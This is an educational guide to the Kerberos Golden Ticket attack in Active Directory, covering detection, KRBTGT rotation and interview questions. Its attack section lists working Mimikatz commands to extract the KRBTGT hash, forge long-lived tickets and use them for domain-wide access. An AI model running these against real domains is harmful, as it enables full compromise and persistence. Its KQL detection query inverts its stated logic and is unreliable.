# 07 — Golden Ticket Attack

> **Section:** 05 — AD Attack Techniques  
> **Difficulty:** Advanced  
> **Protocol exploited:** Kerberos (KRBTGT key)  
> **Privilege required:** Domain Admin (to get KRBTGT hash)

---

## 📌 What is a Golden Ticket?

Every Kerberos TGT is signed with the **KRBTGT account's password hash**. The KDC trusts any TGT that has a valid KRBTGT signature.

If an attacker obtains the KRBTGT hash, they can **forge TGTs for any user — including non-existent users** — with any group memberships, valid for up to 10 years.

> **Simple definition:**  
> A Golden Ticket is a forged Kerberos TGT created using the KRBTGT hash. It grants complete access to any resource in the domain as any user — and remains valid even after password resets, until KRBTGT is rotated twice.

---

## ⚙️ Step-by-Step Attack

```
Prerequisites:
  Attacker has Domain Admin (typically obtained via DCSync or DC compromise)
  Needs: KRBTGT hash + Domain SID

Step 1: Get KRBTGT hash via DCSync
  mimikatz # lsadump::dcsync /user:krbtgt

  Output:
  Hash NTLM: 8f3c2d9e1a7b4f6c... ← KRBTGT hash
  Object Security ID: S-1-5-21-1234567890-987654321-111222333

Step 2: Create Golden Ticket
  mimikatz # kerberos::golden
    /user:FakeAdmin         ← can be ANY name (even non-existent)
    /domain:company.local
    /sid:S-1-5-21-1234567890-987654321-111222333
    /krbtgt:8f3c2d9e1a7b4f6c...
    /groups:512             ← RID 512 = Domain Admins
    /startoffset:0
    /endin:600              ← valid for 600 minutes (10 hours) ← normal-looking
    /renewmax:10080
    /ticket:golden.kirbi

  OR with 10-year lifetime (persistence):
    /endin:5256000          ← 10 years

Step 3: Use the Golden Ticket
  kerberos::ptt golden.kirbi  ← inject into current session

  klist  ← verify ticket is loaded

Step 4: Access anything in the domain
  dir \\DC01\C$ ✅
  dir \\FileServer01\Finance ✅
  psexec.exe \\DC01 cmd.exe ✅
  
  Even if "FakeAdmin" does not exist in AD → ticket still works
  Even if GP changes her password → ticket still works
  Only KRBTGT rotation (twice) invalidates it
```

---

## 🔍 Detection

```
Golden Ticket indicators:
  → Account in ticket does not exist in AD
  → Ticket lifetime > 10 hours (default max)
  → No preceding Event ID 4768 (TGT was never requested from KDC)
  → Account accessing resources it has never accessed before
  → Ticket RC4 encrypted on AES-only environment

Event IDs:
  4624 — Logon with suspicious ticket
  4627 — Group membership info (unusual groups for account)
  
Defender for Identity:
  → "Forged PAC" alert
  → "Golden Ticket activity" alert (detects anomalous TGT properties)

KQL for Sentinel:
  SecurityEvent
  | where EventID == 4768
  | join kind=leftanti (
      SecurityEvent | where EventID == 4624
  ) on TargetAccount
  | where TimeGenerated > ago(1h)
  // Accounts logging in without a preceding TGT request = possible ticket injection
```

---

## 🛡️ Defence

```
1. Rotate KRBTGT password TWICE (primary remediation after compromise):
   
   # First rotation — invalidates existing TGTs
   Set-ADAccountPassword -Identity "krbtgt" \
       -NewPassword (ConvertTo-SecureString (New-Guid).ToString() -AsPlainText -Force) \
       -Reset
   
   # Wait 10+ hours (allow all current TGTs to expire naturally)
   # Without waiting → users will be logged out (tickets invalid)
   
   # Second rotation — removes cached previous password
   Set-ADAccountPassword -Identity "krbtgt" \
       -NewPassword (ConvertTo-SecureString (New-Guid).ToString() -AsPlainText -Force) \
       -Reset
   
   ⚠️ Plan this carefully — it affects all users and services
   ⚠️ Schedule during maintenance window
   ⚠️ Two rotations required: first removes current key, second removes cached previous key

2. Protect Domain Controllers (prevent KRBTGT access):
   → Tier 0 isolation (Section 04-01)
   → PAWs for all DC administration
   → Credential Guard on DCs
   → Monitor DC for process anomalies (Mimikatz)

3. Deploy Microsoft Defender for Identity:
   → Real-time detection of Golden Ticket activity
   → Alerts on forged PAC, anomalous TGT properties

4. Enable Enhanced Security Admin Environment (ESAE):
   → Red forest architecture
   → Admin forest separate from production
   → Highest-security environments

5. Periodic KRBTGT rotation (not just post-incident):
   → Rotate KRBTGT every 180 days as standard practice
   → Makes Golden Tickets created before rotation unusable
```

---

## 🎯 Interview Questions

**Q1. What is a Golden Ticket attack and why is it so persistent?**  
**A:** A Golden Ticket is a forged Kerberos TGT created using the KRBTGT account's password hash. Since all TGTs are signed by KRBTGT, a forged one is indistinguishable from legitimate ones. It is persistent because: it can be for any user (including non-existent ones), it can have a 10-year lifetime, password resets do not invalidate it, and even disabling the target account does not stop it — the KDC validates the KRBTGT signature, not the account status. Only rotating KRBTGT twice removes the ability to forge new tickets.

**Q2. Why must KRBTGT be rotated TWICE to invalidate Golden Tickets?**  
**A:** Active Directory caches the previous KRBTGT password to allow in-flight TGTs to complete without disruption. A Golden Ticket forged before the first rotation is still valid because the DC accepts tickets signed with the previous (cached) key. The second rotation removes the cached previous key — after this, only tickets signed with the current key are accepted. Golden Tickets forged before the first rotation are now completely invalidated.

**Q3. Scenario — You suspect a Golden Ticket was created 3 days ago. Your incident response steps?**  
**A:** (1) Do NOT immediately rotate KRBTGT — first understand the full scope of the breach. (2) Identify how the attacker got KRBTGT hash (DCSync? DC compromise?). (3) Contain the initial access vector. (4) Identify all systems the Golden Ticket was used on from logs. (5) Reset all Domain Admin and Tier 0 account passwords — attacker may have used the window to create backdoor accounts. (6) Schedule a maintenance window and rotate KRBTGT twice with a 10-hour gap between rotations. (7) After second rotation — verify no Golden Ticket access occurs. (8) Deploy or verify Defender for Identity is monitoring for future Golden Ticket activity.

---

*"The Golden Ticket is the ultimate persistence mechanism in Active Directory. It is not a bug — it is how Kerberos works. The only protection is keeping the KRBTGT key secret, which means keeping Domain Controllers completely isolated from any possible compromise."*
